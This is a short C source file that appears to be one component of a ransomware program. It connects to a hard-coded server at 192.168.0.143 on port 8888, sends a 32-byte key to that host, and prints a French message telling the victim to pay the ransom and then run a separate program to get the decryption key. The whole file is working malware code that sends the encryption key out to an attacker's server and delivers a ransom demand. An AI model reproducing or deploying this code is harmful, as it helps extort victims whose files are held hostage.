#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <netdb.h>
#define BUFFER_SIZE 1024

int main (){
    
    int sockid;
    int server_port = 8888;
    char *server_ip = "192.168.0.143";

    sockid = socket(AF_INET, SOCK_STREAM,0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    char key[160] = "0xdb,0xf6,0xcf,0x90,0x41,0xf8,0x8d,0x16,0x6e,0x53,0xd3,0xf8,0x12,0xb9,0x31,0x3e,0x6c,0x8e,0xda,0x76,0x2b,0x51,0x5e,0x23,0x4,0xe9,0xde,0xa,0xe2,0x22,0xe5,0xeb";
    if(connect(sockid,(struct sockaddr *)&server_addr,sizeof(server_addr)) < 0){
    	printf("Erreur lors de la connection");
    	exit(1);
    }
    send(sockid,(const char *)key,strlen(key),0);
    close(sockid);
    printf("Lorsque vous avez payé la rançon lancez le programme jaipayé.c la clé de déchiffrage vous sera donnée dans l'heure");
    
}
